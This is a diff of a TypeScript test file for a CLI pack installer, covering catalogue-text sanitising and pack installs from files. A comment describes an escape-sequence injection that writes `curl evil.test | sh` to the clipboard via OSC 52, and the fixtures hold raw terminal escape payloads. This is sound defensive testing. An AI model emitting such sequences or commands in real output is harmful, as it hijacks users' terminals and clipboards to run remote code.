@@ -208,10 +208,10 @@ test('install refuses a file whose own id is not the entry it is listed under', 
 /* ── a catalogue's words, from somebody further off than a member ───────── */
 
 /*
- * AUDIT THIRTY-NINE FINDING 2, WITH ITS OWN BYTES. A catalogue index is somebody else's file, read from a folder or an
+ * A CATALOGUE'S OWN BYTES, AS AN ATTACKER WOULD WRITE THEM. A catalogue index is somebody else's file, read from a folder or an
  * address, and `readCatalogue` checks an entry's kind, id and versions and nothing of its title, author or summary. Run
  * against the tree before the fix, `search` put OSC 0 (retitle the window), SGR red and an OSC 52 clipboard write of
- * `curl evil.test | sh` on the terminal byte for byte, as the audit measured with `cat-out.txt`.
+ * `curl evil.test | sh` on the terminal byte for byte.
  */
 const OSC_TITLE = 'Club \u001b]0;owned\u0007';
 const SGR_AUTHOR = 'A \u001b[31mRed';
@@ -335,7 +335,7 @@ test("install <file>, preview, list and install <id> print a use case's words wi
 /* ── a pack in packs/, installed from the CLI ───────────────────────────── */
 
 /*
- * BRIEF B3 OF `loop/research-legacy-parity.md`. Four packs sat in `packs/` that nothing could install: `pack install`
+ * A PACK IN `packs/` IS INSTALLABLE FROM THE CLI. Four packs once sat in `packs/` that nothing could install: `pack install`
  * took only `<id> --from <catalogue>`, and the catalogue every host serves listed `reading-list` alone. Run against the
  * tree before this, `braindog pack install packs/project-brief/project-brief.pack.json --dry-run` printed the whole usage
  * line and sent nothing, and `pack install project-brief` said it "takes one id and --from <catalogue>".
@@ -347,10 +347,10 @@ test('pack install <file> --dry-run says the plan and sends nothing; without it 
   const h = await setup(t);
   assert.equal(await pack(['install', PROJECT_BRIEF, '--dry-run'], h.io), 0, h.said.join('\n'));
   assert.equal(h.seen.length, 0, 'a dry run sent something');
-  assert.match(h.out[0] ?? '', /^Project brief 1\.2\.0 reads as an add-on/u);
+  assert.match(h.out[0] ?? '', /^Project brief 1\.2\.1 reads as an add-on/u);
   assert.ok(h.out.includes('  Installs first: portfolio'), h.out.join('\n'));
   assert.ok(h.out.includes('  Adds lists: none; pages: Briefs; rules: none'), h.out.join('\n'));
-  assert.match(h.out.at(-1) ?? '', /^Would ask the owner: Install Project brief 1\.2\.0\? Nothing was sent\.$/u);
+  assert.match(h.out.at(-1) ?? '', /^Would ask the owner: Install Project brief 1\.2\.1\? Nothing was sent\.$/u);
 
   h.out.length = 0;
   assert.equal(await pack(['install', PROJECT_BRIEF], h.io), 0, h.said.join('\n'));
@@ -359,7 +359,7 @@ test('pack install <file> --dry-run says the plan and sends nothing; without it 
   const body = asked[0]?.args.body as { install: string; doc: Record<string, unknown> };
   assert.equal(body.install, 'project-brief');
   assert.deepEqual(body.doc, JSON.parse(readFileSync(PROJECT_BRIEF, 'utf8')));
-  assert.match(h.out.at(-1) ?? '', /^Asked the owner: Install Project brief 1\.2\.0\? .*\/decide\/SG7$/u);
+  assert.match(h.out.at(-1) ?? '', /^Asked the owner: Install Project brief 1\.2\.1\? .*\/decide\/SG7$/u);
 
   /* A USE CASE IS NOT AN ADD-ON, and a file that is neither is refused before anything is sent. */
   assert.equal(await usecase(['new', 'club', '--author', 'Halden'], h.io), 0);
